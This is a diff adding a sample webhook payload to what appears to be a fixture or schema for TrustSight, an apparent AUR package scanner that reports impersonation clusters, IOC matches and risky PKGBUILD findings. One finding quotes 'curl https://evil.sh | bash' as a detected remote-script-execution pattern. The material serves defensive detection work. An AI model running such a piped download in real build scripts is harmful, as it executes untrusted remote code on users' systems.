@@ -115,6 +115,114 @@
     "unresolved_parse_time",
     "unresolved_source"
   ],
+  "ingest": {
+    "body": {
+      "alerts": [
+        {
+          "package": "some-pkg",
+          "rule_id": "H088"
+        }
+      ],
+      "campaign_cluster": [
+        {
+          "count": 3,
+          "members": [
+            "a",
+            "b",
+            "c"
+          ],
+          "rule_id": "G001"
+        },
+        {
+          "count": 2,
+          "members": [
+            "yyay",
+            "parru"
+          ],
+          "rule_id": "G005"
+        }
+      ],
+      "cycle": {
+        "added": 3,
+        "changed": 41,
+        "processed": 44,
+        "removed": 2
+      },
+      "event": "trustsight.alerts",
+      "impersonation": [
+        {
+          "count": 2,
+          "maintainer": "marchos1as",
+          "members": [
+            "yyay",
+            "parru"
+          ],
+          "targets": [
+            "yay",
+            "paru"
+          ]
+        }
+      ],
+      "ioc_matches": [
+        {
+          "aur": "https://aur.archlinux.org/packages/bad-pkg",
+          "indicator": "hash:deadbeef",
+          "package": "bad-pkg"
+        }
+      ],
+      "over_threshold": [
+        {
+          "aur": "https://aur.archlinux.org/packages/hot-pkg",
+          "findings": [
+            {
+              "file": "PKGBUILD",
+              "line": 12,
+              "reason": "Remote Script Execution: curl https://evil.sh | bash",
+              "rule_id": "R001",
+              "severity": "CRITICAL",
+              "weight": 30
+            },
+            {
+              "file": "",
+              "line": null,
+              "reason": "checksums declared for all non-VCS sources",
+              "rule_id": "P001",
+              "severity": "INFO",
+              "weight": 0
+            }
+          ],
+          "last_modified": "2026-05-01 00:00 UTC",
+          "package": "hot-pkg",
+          "rules": [
+            "R001",
+            "P001"
+          ],
+          "score": 45,
+          "version": "1.0 -> 1.1"
+        }
+      ],
+      "over_threshold_grouped": 0,
+      "priority": "default",
+      "refusals": [
+        {
+          "aur": "https://aur.archlinux.org/packages/unread-pkg",
+          "package": "unread-pkg"
+        }
+      ],
+      "title": "TrustSight: impersonation campaign by marchos1as (2 name-clones)",
+      "tool": "trustsight"
+    },
+    "headers": [
+      "webhook-id",
+      "webhook-timestamp",
+      "webhook-key-id",
+      "webhook-signature"
+    ],
+    "method": "POST",
+    "signature_algorithm": "ed25519",
+    "signature_format": "v1=<base64>",
+    "signed_material": "webhook-id.webhook-timestamp.raw_body"
+  },
   "pseudo_rule_ids": [
     "COVERAGE",
     "NOVELTY",
